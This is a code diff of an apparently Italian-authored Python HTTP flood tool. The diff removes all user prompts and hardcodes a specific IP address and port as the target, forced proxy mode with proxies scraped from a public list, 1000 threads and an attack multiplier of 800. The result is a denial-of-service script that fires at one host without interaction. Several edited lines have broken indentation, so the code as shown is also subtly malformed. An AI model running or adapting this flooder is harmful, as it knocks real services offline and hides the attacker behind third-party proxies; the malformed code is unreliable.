@@ -465,17 +465,7 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 	global urlport
 	global choice1
 	global ips
-
-	choice1 = input("\nDo you want one target [0] or more[1] > ")
-
-	if choice1 == "1":
-		ip_file = input("Insert txt file of ips > ")
-		ips = open(ip_file).readlines()
-
-
-
-	else:
-		url = input("\nInsert URL/IP: ").strip()
+		url = "http://51.75.52.94:28015/monuments.json".strip()
 
 		if url == "":
 			print ("Please enter the url.")
@@ -506,39 +496,15 @@ def starturl(): # in questa funzione setto l'url per renderlo usabile per il fut
 
 
 def proxymode():
-	global choice2
-	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
-	if choice2 == "y":
-		choiceproxysocks()
-	else:
-		numthreads()
-
+			choiceproxysocks()
 def choiceproxysocks():
-	global choice3
-	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
-	if choice3 == "0":
 		choicedownproxy()
-	elif choice3 == "1":
-		choicedownsocks()
-	else:
-		print ("You mistyped, try again.")
-		choiceproxysocks()
 
 def choicedownproxy():
-	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
-	if choice4 == "y":
+
 		urlproxy = "http://free-proxy-list.net/"
 		proxyget(urlproxy)
-	else:
-		proxylist()
 
-def choicedownsocks():
-	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
-	if choice4 == "y":
-		urlproxy = "https://www.socks-proxy.net/"
-		proxyget(urlproxy)
-	else:
-		proxylist()
 
 def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 	try:
@@ -567,41 +533,27 @@ def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
 
 def proxylist():
 	global proxies
-	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
-	if out_file == "":
-		out_file = "proxy.txt"
+	out_file = "proxy.txt"
 	proxies = open(out_file).readlines()
 	numthreads()
 
 def numthreads():
 	global threads
-	try:
-		threads = int(input("Insert number of threads (800): "))
-	except ValueError:
-		threads = 800
-		print ("800 threads selected.\n")
+		threads = 1000
 	multiplication()
-
+	
 def multiplication():
 	global multiple
 	try:
-		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
+		multiple = 800
 	except ValueError:
 		print("You mistyped, try again.\n")
 		multiplication()
 	begin()
 
 def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
-	if choice6 == "":
 		loop()
-	elif choice6 == "Enter": #lool
-		loop()
-	elif choice6 == "enter": #loool
-		loop()
-	else:
-		exit(0)
-
+	
 def loop():
 	global threads
 	global acceptall
